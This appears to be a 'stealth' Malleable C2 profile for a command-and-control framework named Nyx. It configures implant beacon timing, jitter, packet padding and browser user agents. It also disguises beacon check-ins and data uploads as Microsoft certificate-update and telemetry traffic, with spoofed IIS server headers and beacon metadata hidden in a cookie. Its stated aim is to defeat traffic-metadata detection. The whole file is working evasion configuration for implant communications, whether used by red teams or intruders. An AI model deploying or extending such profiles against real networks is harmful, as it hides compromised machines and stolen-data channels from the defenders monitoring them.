# Nyx userland stealth Malleable C2 profile.
# Opt-in: NYX_PROFILE=profiles/stealth.profile (server + agent-dev + implant bake).
# Unset NYX_PROFILE keeps the default padding_max==0 / no-timing wire.
#
# Padding + bursty cadence blur packet-length / check-in metadata
# (cf. Striking Back At Cobalt, arXiv:2506.08922). Transforms are
# invertible (base64 + print) so beacon round-trip works.

set sleeptime "60000";
set jitter "25";
set padding_min "64";
set padding_max "512";
set timing_baseline "bursty";

# UA pool — implant/server bake `set useragent` (first/only value).
# Swap the set line to rotate; do not use "Mozilla/4.0 Nyx".
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
# Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
# Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
# Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0

http-get {
    set uri "/c/msdownload/update/v3/static/trustedr/en/authrootstl.cab";
    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Accept-Encoding" "gzip, deflate, br";
        metadata {
            base64;
            prepend "MicrosoftApplicationsTelemetryDeviceId=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Cache-Control" "max-age=900";
        header "Server" "Microsoft-IIS/10.0";
        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/fd/ls/LCIClient/7.0";
    client {
        header "Accept" "application/json";
        header "Content-Type" "application/json";
        header "Accept-Language" "en-US,en;q=0.9";
        output {
            base64;
            print;
        }
    }
    server {
        header "Content-Type" "application/json";
        header "Cache-Control" "private, max-age=0";
        header "Server" "Microsoft-IIS/10.0";
        output {
            base64;
            print;
        }
    }
}
